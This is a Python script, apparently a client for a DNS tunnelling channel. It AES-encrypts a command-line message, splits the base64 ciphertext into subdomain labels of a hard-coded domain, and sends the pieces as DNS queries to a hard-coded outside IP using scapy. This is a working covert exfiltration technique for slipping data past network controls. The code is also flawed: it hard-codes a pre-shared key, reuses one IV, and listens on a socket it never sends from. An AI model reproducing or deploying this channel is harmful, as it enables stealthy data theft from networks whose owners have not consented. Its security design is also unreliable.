from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from scapy.all import *
import base64
import sys
import socket

# Configuration
DNS_SERVER_IP = '13.228.229.230'  # Replace with your DNS server IP
DNS_PORT = 53
DOMAIN = 'sub.brightbuys.me'  # Replace with your target domain

# Pre-shared key (PSK) for exchanging the AES key securely
psk = b"thisisaverysecurekey123456789012"  # Must be 16, 24, or 32 bytes long


# Encrypt AES key using PSK
def encrypt_with_psk(aes_key, psk, iv):
    cipher = AES.new(psk, AES.MODE_CBC, iv)
    encrypted_aes_key = cipher.encrypt(pad(aes_key, AES.block_size))
    return base64.b64encode(iv + encrypted_aes_key).decode('utf-8')


# AES encryption
def encrypt_aes(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    encrypted_message = base64.b64encode(iv + encrypted_data).decode('utf-8')
    print(f"[CLIENT] Original message: {data}")
    print(f"[CLIENT] Encrypted message (base64): {encrypted_message}")
    return encrypted_message


# AES decryption
def decrypt_aes(data, key):
    try:
        print(f"[CLIENT] Encrypted data (base64) for decryption: {data}")
        data = base64.b64decode(data)
        iv = data[:16]
        encrypted_message = data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_message), AES.block_size)
        print(f"[CLIENT] Decrypted message: {decrypted_data.decode('utf-8')}")
        return decrypted_data.decode('utf-8')
    except Exception as e:
        print(f"[CLIENT] Decryption error: {e}")
        return None


# Fragment message to fit within DNS label size limits
def fragment_message(message, max_label_length=63):
    # Ensure the message is properly padded for base64
    missing_padding = len(message) % 4
    if missing_padding:
        message += '=' * (4 - missing_padding)  # Add padding if necessary

    fragments = []
    while message:
        fragments.append(message[:max_label_length])
        message = message[max_label_length:]
    return fragments


# Send DNS query based on the query type
def send_dns_query(server_ip, query_pkt, timeout=10):  # Increase timeout to 10 seconds
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        send(query_pkt)
        response, _ = sock.recvfrom(1024)
        return response
    except socket.timeout:
        print("Request timed out")
    finally:
        sock.close()
        
        
# AES decryption for the encrypted AES key
def decrypt_with_psk(encrypted_data, psk):
    try:
        print(f"[CLIENT] Encrypted data (base64) for AES key decryption: {encrypted_data}")
        data = base64.b64decode(encrypted_data)
        iv = data[:16]  # Extract the IV (first 16 bytes)
        encrypted_aes_key = data[16:]  # The rest is the encrypted AES key
        cipher = AES.new(psk, AES.MODE_CBC, iv)
        decrypted_aes_key = unpad(cipher.decrypt(encrypted_aes_key), AES.block_size)
        print(f"[CLIENT] Decrypted AES Key: {decrypted_aes_key}")
        return decrypted_aes_key
    except Exception as e:
        print(f"[CLIENT] AES key decryption error: {e}")
        return None

# TODO: FIX THE QUERY TYPE
# Craft DNS query based on the query type (TXT, CNAME, or A)
def craft_dns_query(fragment, domain, query_type='TXT'):
    if not fragment:
        print("Error: Empty fragment, skipping query")
        return None
    full_query_name = f"{fragment}.{domain}."
    print(f"Sending DNS Query: {full_query_name}")
    qtype_mapping = {'TXT': 16, 'CNAME': 5, 'A': 1}
    qtype_value = qtype_mapping.get(query_type, 16)
    dns_query = (
            IP(dst=DNS_SERVER_IP) /
            UDP(sport=RandShort(), dport=53) /
            DNS(rd=1, qd=DNSQR(qname=full_query_name, qtype=qtype_value))
    )
    return dns_query


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 client.py <message> <query_type>")
        sys.exit(1)

    message_to_send = sys.argv[1]
    query_type = sys.argv[2].upper()

    # Step 1: Generate AES key and IV for the session
    aes_key = get_random_bytes(32)  # 32 bytes for AES-256
    aes_iv = get_random_bytes(16)

    # Step 2: Encrypt the AES key using the PSK
    encrypted_aes_key = encrypt_with_psk(aes_key, psk, aes_iv)

    # Step 3: Send the encrypted AES key as a DNS query
    encrypted_aes_key_fragments = fragment_message(encrypted_aes_key)
    for fragment in encrypted_aes_key_fragments:
        query_pkt = craft_dns_query(fragment, DOMAIN, 'TXT')
        print(f"[CLIENT] Sending AES key fragment: {fragment}")
        response = send_dns_query(DNS_SERVER_IP, query_pkt)

    # Step 4: Encrypt the actual message using the AES key
    encrypted_message = encrypt_aes(message_to_send, aes_key, aes_iv)
    
    # # For testing
    # decrypted_aes_key = decrypt_with_psk(encrypted_aes_key, psk)
    # decrypted_message = decrypt_aes(encrypted_message, aes_key)
    # print(f"This is decrypted: {decrypted_message}")
    
    fragments = fragment_message(encrypted_message)
    for fragment in fragments:
        query_pkt = craft_dns_query(fragment, DOMAIN, query_type)
        print(f"[CLIENT] Sending message fragment: {fragment}")
        response = send_dns_query(DNS_SERVER_IP, query_pkt)
    
    print("All Messages Sent")    
        
